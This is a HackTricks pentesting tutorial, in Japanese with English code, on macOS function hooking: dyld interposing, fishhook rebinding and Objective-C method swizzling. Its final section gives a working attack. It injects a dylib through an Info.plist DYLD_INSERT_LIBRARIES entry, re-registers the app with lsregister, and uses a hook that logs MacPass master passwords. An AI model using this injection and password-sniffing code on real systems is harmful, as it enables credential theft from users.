# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

**元の**関数と**置換後の**関数を参照する**関数ポインタ**のタプルを含む **`__interpose` (`__DATA___interpose`)** section（または **`S_INTERPOSING`** が指定された section）を持つ **dylib** を作成します。

次に、**`DYLD_INSERT_LIBRARIES`** を使用して dylib を**inject**します（interposing は main app の load 前に行う必要があります）。当然ながら、ここでも [**`DYLD_INSERT_LIBRARIES`** の使用に適用される**制限**が適用されます](macos-library-injection/index.html#check-restrictions)。

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable は interposing の debug に使用でき、interpose process を出力します。

また、**interposing は process と load された libraries の間で発生する**ことにも注意してください。shared library cache では機能しません。

### Dynamic Interposing

現在では、**`dyld_dynamic_interpose`** function を使用して function を動的に interpose することも可能です。これにより、**beginning** からのみ実行するのではなく、**runtime** に **programmatically** function を interpose できます。

必要なのは、**置き換える function と replacement function の **tuples** を指定することだけです。
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

すでに **process 内で** code execution を取得しており、target を relaunch せずに **import された C function** を hook したい場合、非常に一般的な primitive が **symbol rebinding**（**`fishhook`** によって広く知られるようになった手法）です。

**`__interpose`** section を使用する代わりに、この technique は Mach-O metadata（`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`）を走査し、current image が使用する import slot を **overwrite** します。これは **すでに実行中の** process 内で functions を hook したり、**`rebind_symbols_image`** によって **1 つの image だけ**を hook したりする場合に非常に有用です。<sup>[[2]](#references)</sup>

> [!TIP]
> これは実際に **import pointer** を経由する calls にのみ影響します。target function が同じ image 内で **directly** call されている場合、書き換える imported slot が存在しないため、この technique ではその call site を捕捉できません。
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
最近の macOS バージョンでは、多くの rebinding targets が書き込み可能な **`__DATA`** pages に存在しなくなっています。通常、rebinder は pointer を patching する前に、**`__DATA_CONST`** を一時的に writable にする必要があります。さらに、Apple Silicon / **`arm64e`** では、**`__AUTH_CONST.__auth_got`** 内に authenticated pointers と追加の indirection があることを想定すべきです。そのため、classic な lazy/non-lazy symbol pointer sections だけを scan する rebinder では、一部の call sites を見落とす可能性があります。<sup>[[3]](#references)</sup>

> [!CAUTION]
> **`arm64e`** ABI は、多くの function pointers に **Pointer Authentication (PAC)** を使用します。Intel で機能していた blind pointer writes は、Apple Silicon では call site を壊す可能性があります。独自の rebinder や inline hooker を作成する場合は、**`<ptrauth.h>`** の **`ptrauth_sign_unauthenticated`** や **`ptrauth_auth_and_resign`** などの helpers を使用できるよう準備し、特に **`arm64e`** targets でテストしてください。

**`__AUTH`**、**`__AUTH_CONST`**、**`__auth_got`** の詳細については、[このページ](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md)を確認してください。

## Method Swizzling

ObjectiveC では、method は次のように呼び出されます: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

必要なのは **object**、**method**、**params** です。また、method が呼び出されると、function **`objc_msgSend`** を使用して **msg が送信されます**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

object は **`someObject`**、method は **`@selector(method1p1:p2:)`**、arguments は **value1** と **value2** です。

object structures をたどることで、**names** と method code への **pointers** が **located** されている **array of methods** に到達できます。

> [!CAUTION]
> methods と classes は names に基づいて access されるため、この情報は binary に stored されています。そのため、`otool -ov </path/bin>` または [`class-dump </path/bin>`](https://github.com/nygard/class-dump) で retrieve できます。

### raw methods へのアクセス

以下の example のように、method の name、params の number、address などの information に access できます:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### `method_exchangeImplementations`によるMethod Swizzling

関数 **`method_exchangeImplementations`** を使用すると、**一方の関数の実装のアドレス**を**もう一方の関数の実装のアドレス**と**変更**できます。

> [!CAUTION]
> そのため、ある関数が呼び出されると、**もう一方の関数が実行されます**。
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> この場合、**正規の**メソッドの**実装コード**が**メソッド**の**名前**を**検証**すると、この swizzling を**検出**して実行を阻止できる可能性があります。
>
> 以下の technique にはこの制限はありません。

### Method Swizzling with method_setImplementation

前の形式は、2つのメソッドの実装を互いに変更しているため、奇妙です。**`method_setImplementation`** 関数を使用すると、ある**メソッド**の**実装**をもう一方のものに**変更**できます。

新しい実装から元の実装を呼び出す場合は、上書きする前に、元の実装のアドレスを必ず**保存**してください。上書きした後では、そのアドレスを見つけるのがはるかに困難になるためです。
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking 攻撃の方法論

このページでは、関数を hook するさまざまな方法について説明しました。ただし、いずれも**攻撃対象のプロセス内で code を実行する**必要があります。

そのために使用できる最も簡単な technique は、[環境変数または hijacking による Dyld](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) を inject することです。ただし、[Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) によっても実行できると思われます。

ただし、どちらの option も**保護されていない** binary/process に**限定**されます。制限事項の詳細については、それぞれの technique を確認してください。

一方、function hooking attack は非常に具体的なものです。attacker は**プロセス内部から機密情報を盗むため**にこれを実行します（そうでなければ、単に process injection attack を実行すればよいでしょう）。また、この機密情報は MacPass など、ユーザーが download した Apps 内に存在する可能性があります。

したがって attacker vector は、vulnerability を見つけるか、application の signature を strip したうえで、application の Info.plist を通じて **`DYLD_INSERT_LIBRARIES`** env variable を inject し、次のようなものを追加することになります:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
そして、アプリケーションを**再登録**します：
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
そのライブラリに、Passwords、messages などの情報を exfiltrate する hooking code を追加します。

> [!CAUTION]
> macOS の新しいバージョンでは、アプリケーションバイナリの **signature を strip** し、それが以前に実行されていた場合、macOS はそのアプリケーションを **実行しなくなる** ことに注意してください。

#### Library の例
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## 参考文献

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: Mach-O バイナリ内のシンボルを動的に再バインドするプロセスを簡略化するライブラリ](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Clang Documentation](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
